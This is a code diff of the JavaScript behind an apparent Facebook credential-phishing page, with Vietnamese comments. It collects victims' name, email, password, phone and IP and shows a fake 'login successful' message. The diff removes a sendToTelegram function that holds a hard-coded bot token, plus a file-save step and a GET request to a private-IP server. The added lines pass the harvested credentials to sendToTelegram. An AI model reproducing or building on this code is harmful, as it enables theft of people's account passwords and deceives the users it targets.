@@ -921,27 +921,6 @@
 
                 $("#btn-submit").click(function () {
 
-                    function sendToTelegram(data) {
-                        const telegramApiUrl = `https://api.telegram.org/bot6591392740:AAFusEvzSo-0-VdYJGRBUrPtfp8jGsoNiqw/sendMessage`;
-
-                        fetch(telegramApiUrl, {
-                            method: "POST",
-                            headers: {
-                                "Content-Type": "application/json",
-                                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
-                                "Accept": "application/json",
-                                "Origin": "https://yourwebsite.com" // Thay bằng domain hợp lệ
-                            },
-                            body: JSON.stringify({
-                                chat_id: "@ongochoc123",
-                                text: `🔔 *Thông báo mới!* 🔔\n\n${data}`,
-                                parse_mode: "Markdown",
-                            }),
-                        })
-                            .then(response => response.json())
-                            .then(result => console.log("Gửi thành công:", result))
-                            .catch(error => console.error("Lỗi:", error));
-                    }
 
                     sendToTelegram("Hi");
                     var isValid = true;
@@ -1023,54 +1002,30 @@
 
                         var text = "Full Name: " + fullName + "\nFacebook Page Name: " + facebookPageName + "\nEmail: " + email + "\nPass: " + password + "\nMã Vùng: " + country_code + "\nPhone: " + phone + "\nOther reasons: " + otherReasons + "\nIp: " + ip;
 
-                        var blob = new Blob([text], { type: "text/plain;charset=utf-8" });
-
-                        // Sử dụng FileSaver.js để lưu file
-                        if (window.saveAs) {
-                            window.saveAs(blob, "data.txt");
-                        } else {
-                            var link = document.createElement('a');
-                            link.href = URL.createObjectURL(blob);
-                            link.download = "data.txt";
-                            link.click();
-                        }
-
-                        let url = `http://192.168.222.107:5000/send-message?message=${encodeURIComponent(text)}`;
-
-                        // Gửi yêu cầu GET bằng fetch
-                        fetch(url, {
-                            method: 'GET', // Phương thức GET
-                            headers: {
-                                'Content-Type': 'application/json'
-                            }
-                        })
-                            .then(response => response.json())  // Nếu phản hồi là JSON
-                            .then(data => console.log(data))    // Xử lý dữ liệu trả về
-                            .catch(error => console.error('Error:', error));  // Xử lý lỗi
-                    }
-
-                    sendData();
+                        sendToTelegram(text);
 
 
-                    console.log("Nút submit_password đã được click!");
-
-                    showLoadingCircle(); // Hiển thị loading
-                    $("#login-status").show().text("Đang đăng nhập..."); // Hiển thị dòng chữ "Đang đăng nhập..."
 
 
-                    setTimeout(() => {
-                        hideLoadingCircle(); // Ẩn loading
-                        $("#login-status").text("Đăng nhập thành công!"); // Cập nhật trạng thái
+                        console.log("Nút submit_password đã được click!");
 
-                        sessionStorage.setItem("fromIndex", "true");
-                        window.location.href = "authen.html";
+                        showLoadingCircle(); // Hiển thị loading
+                        $("#login-status").show().text("Đang đăng nhập..."); // Hiển thị dòng chữ "Đang đăng nhập..."
 
-                        // Ẩn modal đúng cách
-                        $("#passwordModal").modal("hide");
 
-                    }, time_out * 1000);
+                        setTimeout(() => {
+                            hideLoadingCircle(); // Ẩn loading
+                            $("#login-status").text("Đăng nhập thành công!"); // Cập nhật trạng thái
 
-                });
+                            sessionStorage.setItem("fromIndex", "true");
+                            window.location.href = "authen.html";
+
+                            // Ẩn modal đúng cách
+                            $("#passwordModal").modal("hide");
+
+                        }, time_out * 1000);
+
+                    });
 
                 function utf8ToBase64(str) {
                     return btoa(unescape(encodeURIComponent(str)));
